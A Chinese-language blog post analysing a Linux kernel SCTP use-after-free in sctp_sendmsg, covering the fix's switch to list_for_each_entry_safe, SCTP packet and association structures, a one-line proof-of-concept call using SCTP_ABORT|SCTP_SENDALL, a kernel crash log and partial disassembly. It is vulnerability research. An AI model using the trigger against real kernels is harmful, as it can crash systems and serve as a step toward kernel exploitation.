## 补丁分析
补丁链接 
    Diffstat
    -rw-r--r--  net/sctp/socket.c   4   
    1 files changed, 2 insertions, 2 deletions
    diff --git a/net/sctp/socket.c b/net/sctp/socket.c
    index f93c3cf..65d6d04 100644
    --- a/net/sctp/socket.c
    +++ b/net/sctp/socket.c
    @@ -2027,7 +2027,7 @@ static int sctp_sendmsg(struct sock *sk, struct msghdr *msg, size_t msg_len)
        struct sctp_endpoint *ep = sctp_sk(sk)->ep;
        struct sctp_transport *transport = NULL;
        struct sctp_sndrcvinfo _sinfo, *sinfo;
    -   struct sctp_association *asoc;
    +   struct sctp_association *asoc, *tmp;
        struct sctp_cmsgs cmsgs;
        union sctp_addr *daddr;
        bool new = false;
    @@ -2053,7 +2053,7 @@ static int sctp_sendmsg(struct sock *sk, struct msghdr *msg, size_t msg_len)
        /* SCTP_SENDALL process */
        if ((sflags & SCTP_SENDALL) && sctp_style(sk, UDP)) {
    -       list_for_each_entry(asoc, &ep->asocs, asocs) {
    +       list_for_each_entry_safe(asoc, tmp, &ep->asocs, asocs) {
                err = sctp_sendmsg_check_sflags(asoc, sflags, msg,
                                msg_len);
                if (err == 0)
结合补丁可以看出来在`sctp_sendmsg`函数中，将宏`list_for_each_entry`替换为`list_for_each_entry_safe`,这两个宏均可以遍历给定的一个列表，针对这个宏的相关定义[这篇文章](https://blog.csdn.net/richard_liujh/article/details/46325327)写得很清楚，这里只简要写一下每个宏对应的功能
    list_first_entry(ptr, type, member)：获取list的第一个元素，调用list_entry(ptr->next, type, member)
    list_entry(ptr, type, member)：实际调用container_of(ptr, type, member)
    container_of(ptr, type, member) ：根据member的偏移，求type类型结构体的首地址ptr
这两个宏区别在哪呢？
list_for_each_entry
    #define list_for_each_entry(pos, head, member)              \
        for (pos = list_first_entry(head, typeof(*pos), member);    \ //获取链表第一个结构体元素
             &pos->member != (head);                    \ //当前结构体是不是最后一个
             pos = list_next_entry(pos, member))       //获取下一个pos结构体
list_for_each_entry_safe
    #define list_for_each_entry_safe(pos, n, head, member)          \
        for (pos = list_first_entry(head, typeof(*pos), member),    \
            n = list_next_entry(pos, member);           \
             &pos->member != (head);                    \
             pos = n, n = list_next_entry(n, member))
在内核源码的注释里也已经写了，list_for_each_entry_safe
不仅可以遍历给定类型的列表，还能防止删除对应的列表项，因为`list_for_each_entry_safe`每次都会提前获取next结构体指针，防止pos被删除以后，再通过pos获取可能会出发空指针解引用或其他问题。
补丁的原理应该就是这样。
## sctp协议
#### 报头
sctp包结构：由一个公共头，以及一个或几个chunk组成。
    0                   1                   2                   3
            0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           |                        Common Header                          |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           |                          Chunk #1                             |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           |                           ...                                 |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
           |                          Chunk #n                             |
           +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
下面是我用wireshark抓的`COOKIE_ECHO_DATA`包相关信息
在公共头部除了包含源目的端口，校验和，还包含一个`Verification Tag`，用于确定一条sctp连接。
下面是chunk结构
    0                   1                   2                   3   
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |   Chunk Type  | Chunk  Flags  |        Chunk Length           |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    \                                                               \
    /                          Chunk Value                          /
    \                                                               \
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#### 关联
关联是sctp中一个很重要的概念，关联结构由`sctp_assocition`结构体表示
该结构体中，几个重要的成员
  * assoc_id : 关联id（唯一）
  * c : sctp_cookie 与某个关联状态相关的cookie
  * peer ： 结构体表示关联的对等端点（远程端点）
    * transport_addr_list：保存了建立关联以后的一个或多个地址
    * primary_path：建立初始连接时使用的地址
  * state：关联的状态
## 编写poc
需要完整的poc可以私信，其实很好构造，主要是在发送sctp消息的时候，将flags设置为`SCTP_ABORT|SCTP_SENDALL`即可。
    sctp_sendmsg(server_fd,&recvbuf,sizeof(recvbuf),(struct sockaddr*)&client_addr,sizeof(client_addr),sri.sinfo_ppid,SCTP_ABORT|SCTP_SENDALL,sri.sinfo_stream,0,0
## poc调试
编译并运行poc，内核崩溃了，但是崩溃信息并不像想象的那样,crash如下
    [   16.527019] general protection fault: 0000 [#1] SMP NOPTI
    [   16.527784] CPU: 1 PID: 1805 Comm: poc Not tainted 4.20.1 #5
    [   16.527784] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
    [   16.527784] RIP: 0010:sctp_sendmsg_check_sflags+0x2/0xa0
    [   16.527784] Code: 6f 30 be 08 00 00 00 e8 1c fe f1 ff 48 8b 73 78 31 d2 48 89 ef 5b 5d 48 83 ee 78 e9 18 9c 00 00 5b 5d c3 0f 1f 44 00 00 55 53  8b 87 30 02 00 00 48 8b 47 20 45 85 c0 48 8b 68 30 75 09 83 b8
    [   16.527784] RSP: 0018:ffffc90000bbfc50 EFLAGS: 00010216
    [   16.527784] RAX: 0000000000000000 RBX: ffffc90000bbfdc0 RCX: 0000000000000014
    [   16.527784] RDX: ffffc90000bbfec0 RSI: 0000000000000044 RDI: dead000000000088
    [   16.527784] RBP: ffff888075098040 R08: ffff888074ad4e48 R09: ffff888074ad4e80
    [   16.527784] R10: 0000000000000000 R11: ffff888074ad4e48 R12: 0000000000000014
    [   16.527784] R13: dead000000000088 R14: ffffc90000bbfec0 R15: ffff888074c43db0
    [   16.527784] FS:  00007fee5a290700(0000) GS:ffff88807db00000(0000) knlGS:0000000000000000
    [   16.527784] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    [   16.527784] CR2: 00007fee5ab4a1b0 CR3: 0000000074dfa000 CR4: 00000000000006e0
    [   16.527784] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
    [   16.527784] DR3: 0000000000000000 DR6: 00000000ffff4ff0 DR7: 0000000000000400
    [   16.527784] Call Trace:
    [   16.527784]  sctp_sendmsg+0x51e/0x6f0
    [   16.527784]  sock_sendmsg+0x31/0x40
    [   16.527784]  ___sys_sendmsg+0x26a/0x2c0
    [   16.527784]  ? __wake_up_common_lock+0x84/0xb0
    [   16.527784]  ? n_tty_open+0x90/0x90
    [   16.527784]  ? tty_write+0x1e7/0x310
    [   16.527784]  ? __sys_sendmsg+0x59/0xa0
    [   16.527784]  __sys_sendmsg+0x59/0xa0
    [   16.527784]  do_syscall_64+0x43/0xf0
    [   16.527784]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [   16.527784] RIP: 0033:0x7fee5ae41eb0
    ==================================================================================
        kasan:
    [  372.233643] BUG: KASAN: wild-memory-access in sctp_sendmsg_check_sflags+0x24/0x110
    [  372.233643] Read of size 8 at addr dead0000000000a8 by task poc/1813
在分析这个漏洞之前我看过网上的一篇分析文章，里面指出漏洞出发是因为将asoc置0了。如图：
如果是因为asoc被置零导致的空指针解引用，那么不应该会执行到函数`sctp_sendmsg_check_sflags+0x2/0xa0`，为什么这么说呢？下面是我截取的部分`sctp_sendmsg`的汇编。
    0xffffffff81969fd7 :    mov    r15,QWORD PTR [rdi+0x3b8] // r15 == ep
    => 0xffffffff8196a13c :   movzx  eax,r13w
       0xffffffff8196a140 :   test   r13b,0x40
       0xffffffff8196a144 :   mov    DWORD PTR [rsp],eax
       0xffffffff8196a147 :   jne    0xffffffff8196a4ae 